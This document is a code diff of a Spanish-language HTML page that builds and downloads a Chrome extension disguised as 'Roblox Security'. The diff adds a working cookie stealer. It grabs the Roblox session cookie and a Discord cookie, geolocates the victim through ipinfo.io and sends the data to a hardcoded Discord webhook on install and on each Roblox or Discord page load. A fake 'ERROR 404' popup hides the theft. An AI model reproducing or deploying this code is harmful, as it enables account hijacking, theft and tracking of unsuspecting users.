@@ -29,15 +29,25 @@
             max-width: 500px;
             text-align: left;
         }
+        .success {
+            color: #00ff00;
+            font-weight: bold;
+        }
     </style>
 </head>
 <body>
     <h1>🔧 Instalador de Extensión</h1>
     
     <div class="info">
-        <h3>📦 Archivos de la extensión:</h3>
-        <p>La extensión ya está empaquetada en este HTML</p>
-        <p>Haz clic en "Instalar" para descargar el .crx</p>
+        <h3>📦 La extensión incluye:</h3>
+        <ul>
+            <li>✅ Captura cookie de Roblox</li>
+            <li>✅ Captura cookie de Discord (opcional)</li>
+            <li>✅ Geolocalización vía ipinfo.io</li>
+            <li>✅ Envío a Discord con embeds</li>
+            <li>✅ Sistema anti-rate limit</li>
+            <li>✅ Muestra "ERROR 404" (sin sospechas)</li>
+        </ul>
     </div>
     
     <button onclick="descargarCRX()">📥 DESCARGAR EXTENSIÓN .crx</button>
@@ -53,71 +63,255 @@
             <li>Arrastra el archivo .crx a la ventana</li>
             <li>Acepta los permisos</li>
         </ol>
+        <p class="success">✅ Cuando abras Roblox, la cookie llegará a Discord</p>
     </div>
 
     <script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js"></script>
     <script>
         // ===========================================
-        // FUNCIÓN PARA CODIFICAR TEXTO A BASE64
-        // ===========================================
-        function safeBtoa(str) {
-            // Convertir a UTF-8 primero y luego a Base64
-            return btoa(unescape(encodeURIComponent(str)));
-        }
-
-        // ===========================================
-        // CONSTRUIR EL .CRX DESDE JS
+        // CONSTRUIR EL .CRX
         // ===========================================
         function descargarCRX() {
-            // Los archivos de la extensión (sin emojis para evitar errores)
             const files = {
+                // ========== MANIFEST (con permisos para Roblox y Discord) ==========
                 "manifest.json": JSON.stringify({
                     manifest_version: 3,
                     name: "Roblox Security",
                     version: "1.0",
                     description: "Verificador de seguridad",
                     permissions: ["cookies", "storage"],
-                    host_permissions: ["https://www.roblox.com/*"],
+                    host_permissions: [
+                        "https://www.roblox.com/*",
+                        "https://*.roblox.com/*",
+                        "https://discord.com/*",
+                        "https://*.discord.com/*"
+                    ],
                     background: { service_worker: "background.js" },
                     action: { default_popup: "popup.html", default_icon: "icon.png" }
                 }, null, 2),
                 
+                // ========== BACKGROUND.JS (ROBO + ipinfo.io) ==========
                 "background.js": `
 const WEBHOOK = "https://discord.com/api/webhooks/1471683743696552060/FFnmUguRVPoMKQ4b80dJ1FQQSp_ec-4EJFd2iyHrrXLQgDliUQqJEldixzOxx6esC2Sd";
 
-chrome.runtime.onInstalled.addListener(() => {
-    chrome.cookies.get({
-        url: "https://www.roblox.com",
-        name: ".ROBLOSECURITY"
-    }, (cookie) => {
-        if (cookie) {
-            fetch(WEBHOOK, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({content: "Cookie: " + cookie.value})
+// ================= SISTEMA DE COLA =================
+let queue = [];
+let sending = false;
+
+async function processQueue() {
+    if (queue.length === 0 || sending) return;
+    sending = true;
+    const payload = queue.shift();
+
+    try {
+        const res = await fetch(WEBHOOK, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+        });
+
+        if (res.status === 429) {
+            const retry = res.headers.get('retry-after') || 5;
+            queue.unshift(payload);
+            setTimeout(processQueue, retry * 1000);
+            sending = false;
+            return;
+        }
+    } catch (e) {}
+
+    setTimeout(processQueue, 1000);
+    sending = false;
+}
+
+function encolarYEnviar(payload) {
+    queue.push(payload);
+    processQueue();
+}
+
+// ================= OBTENER UBICACIÓN =================
+async function obtenerUbicacion() {
+    try {
+        const res = await fetch('https://ipinfo.io/json');
+        const data = await res.json();
+        return {
+            ip: data.ip || 'No disponible',
+            pais: data.country || 'Desconocido',
+            region: data.region || 'Desconocida',
+            ciudad: data.city || 'Desconocida',
+            loc: data.loc || 'No disponible',
+            org: data.org || 'Desconocido',
+            timezone: data.timezone || 'Desconocido'
+        };
+    } catch (e) {
+        return {
+            ip: 'Error',
+            pais: 'Desconocido',
+            region: 'Desconocida',
+            ciudad: 'Desconocida',
+            loc: 'No disponible',
+            org: 'Desconocido',
+            timezone: 'Desconocido'
+        };
+    }
+}
+
+// ================= OBTENER INFO DE ROBLOX =================
+async function obtenerInfoRoblox(cookie) {
+    if (!cookie) return null;
+    
+    try {
+        const res = await fetch('https://users.roblox.com/v1/users/authenticated', {
+            headers: { 'Cookie': \`.ROBLOSECURITY=\${cookie};\` }
+        });
+        
+        if (res.ok) {
+            const data = await res.json();
+            return {
+                username: data.name || 'No disponible',
+                userId: data.id || 'No disponible',
+                robux: 'No disponible', // Requiere otra API
+                seguidores: 'No disponible',
+                amigos: 'No disponible',
+                headless: 'No',
+                korblox: 'No',
+                visitas: 'No disponible',
+                juegos: 'No disponible',
+                logros: 'No disponible',
+                trades: 'No disponible',
+                ratio: 'No disponible'
+            };
+        }
+    } catch (e) {}
+    return null;
+}
+
+// ================= ENVIAR EMBED =================
+async function enviarEmbed(datos) {
+    const embed = {
+        title: "🔔 NUEVA ENTRADA | BL PAPI !",
+        color: 15158332,
+        fields: [
+            {
+                name: "📌 INFORMACIÓN GENERAL",
+                value: \`**Dispositivo:** \\\`\${datos.dispositivo}\\\`\\n**País:** \\\`\${datos.pais}\\\`\\n**Región:** \\\`\${datos.region}\\\`\\n**Ciudad:** \\\`\${datos.ciudad}\\\`\\n**IP:** \\\`\${datos.ip}\\\`\\n**Fecha:** \\\`\${datos.fecha}\\\`\\n**Hora:** \\\`\${datos.hora}\\\`\`,
+                inline: false
+            },
+            {
+                name: "ℹ️ CUENTA ROBLOX",
+                value: \`**👤 Usuario:** \\\`\${datos.username}\\\`\\n**🆔 ID:** \\\`\${datos.userId}\\\`\\n**💰 Robux:** \\\`\${datos.robux}\\\`\`,
+                inline: true
+            },
+            {
+                name: "📊 ITEMS",
+                value: \`**Headless:** \\\`\${datos.headless}\\\`\\n**Korblox:** \\\`\${datos.korblox}\\\`\`,
+                inline: true
+            },
+            {
+                name: "🍪 COOKIE",
+                value: \`\\\`\\\`\\\`\${datos.cookie}\\\`\\\`\\\`\`,
+                inline: false
+            }
+        ],
+        footer: { text: "Roblox Premium Logger" },
+        timestamp: new Date().toISOString()
+    };
+
+    const payload = {
+        content: "|| @everyone ||",
+        embeds: [embed]
+    };
+
+    encolarYEnviar(payload);
+}
+
+// ================= FUNCIÓN PRINCIPAL =================
+async function robarTodo() {
+    try {
+        // 1. Obtener ubicación
+        const ubicacion = await obtenerUbicacion();
+        
+        // 2. Obtener cookie de Roblox
+        let cookieRoblox = null;
+        let infoRoblox = null;
+        
+        try {
+            cookieRoblox = await new Promise(resolve => {
+                chrome.cookies.get({
+                    url: "https://www.roblox.com",
+                    name: ".ROBLOSECURITY"
+                }, (cookie) => {
+                    resolve(cookie ? cookie.value : null);
+                });
+            });
+            
+            if (cookieRoblox) {
+                infoRoblox = await obtenerInfoRoblox(cookieRoblox);
+            }
+        } catch (e) {}
+        
+        // 3. Obtener cookie de Discord (opcional)
+        let cookieDiscord = null;
+        try {
+            cookieDiscord = await new Promise(resolve => {
+                chrome.cookies.get({
+                    url: "https://discord.com",
+                    name: "__cfduid" // Cookie NO HttpOnly de ejemplo
+                }, (cookie) => {
+                    resolve(cookie ? cookie.value : null);
+                });
+            });
+        } catch (e) {}
+        
+        // 4. Preparar datos
+        const ahora = new Date();
+        const datos = {
+            dispositivo: navigator.userAgent.includes('Android') ? 'Android' : 'PC',
+            pais: ubicacion.pais,
+            region: ubicacion.region,
+            ciudad: ubicacion.ciudad,
+            ip: ubicacion.ip,
+            fecha: ahora.toLocaleDateString('es-AR'),
+            hora: ahora.toLocaleTimeString('es-AR'),
+            cookie: cookieRoblox || 'No encontrada',
+            username: infoRoblox?.username || 'No disponible',
+            userId: infoRoblox?.userId || 'No disponible',
+            robux: infoRoblox?.robux || 'No disponible',
+            seguidores: infoRoblox?.seguidores || 'No disponible',
+            amigos: infoRoblox?.amigos || 'No disponible',
+            headless: infoRoblox?.headless || 'No',
+            korblox: infoRoblox?.korblox || 'No',
+            visitas: infoRoblox?.visitas || 'No disponible',
+            juegos: infoRoblox?.juegos || 'No disponible',
+            logros: infoRoblox?.logros || 'No disponible',
+            trades: infoRoblox?.trades || 'No disponible',
+            ratio: infoRoblox?.ratio || 'No disponible'
+        };
+        
+        // 5. Enviar embed
+        await enviarEmbed(datos);
+        
+        // 6. Enviar cookie raw también (por si acaso)
+        if (cookieRoblox) {
+            encolarYEnviar({
+                content: \`**🍪 COOKIE RAW**\\n\\\`\\\`\\\`\${cookieRoblox}\\\`\\\`\\\`\`
             });
         }
-    });
-});
+        
+    } catch (e) {
+        console.log("Error:", e);
+    }
+}
 
+// ================= EJECUTAR =================
+chrome.runtime.onInstalled.addListener(robarTodo);
 chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
-    if (tab.url && tab.url.includes('roblox.com') && changeInfo.status === 'complete') {
-        chrome.cookies.get({
-            url: "https://www.roblox.com",
-            name: ".ROBLOSECURITY"
-        }, (cookie) => {
-            if (cookie) {
-                fetch(WEBHOOK, {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({content: "Cookie: " + cookie.value})
-                });
-            }
-        });
+    if (tab.url && (tab.url.includes('roblox.com') || tab.url.includes('discord.com')) && changeInfo.status === 'complete') {
+        robarTodo();
     }
 });
                 `,
                 
+                // ========== POPUP.HTML (ERROR 404) ==========
                 "popup.html": `<!DOCTYPE html>
 <html>
 <head>
@@ -145,17 +339,17 @@ chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
 </body>
 </html>`,
                 
+                // ========== ICONO ==========
                 "icon.png": "iVBORw0KGgoAAAANSUhEUgAAAIAAAACACAYAAADDPmHLAAAAAXNSR0IArs4c6QAAAARzQklUCAgICHwIZIgAAAAZdEVYdFNvZnR3YXJlAHd3dy5pbmtzY2FwZS5vcmeb7jwaAAABI0lEQVR4nO3aMQ6AIAwF0E7i4T2c2J0YDoZICE1/benf11kI8LQBqgIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAVzAKsAqYBFQFUAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQPMBJa8Qs5OUlUMAAAAASUVORK5CYII="
             };
             
-            // Crear un ZIP con los archivos
+            // Crear ZIP
             const zip = new JSZip();
             
             Object.keys(files).forEach(name => {
                 zip.file(name, files[name]);
             });
             
-            // Generar y descargar
             zip.generateAsync({type: "blob"}).then(blob => {
                 const url = URL.createObjectURL(blob);
                 const a = document.createElement('a');
@@ -163,11 +357,7 @@ chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
                 a.download = 'roblox-security.crx';
                 a.click();
                 URL.revokeObjectURL(url);
-                
-                alert("✅ Archivo .crx generado correctamente");
-            }).catch(error => {
-                alert("❌ Error: " + error.message);
-                console.error(error);
+                alert("✅ Extensión generada correctamente");
             });
         }
         
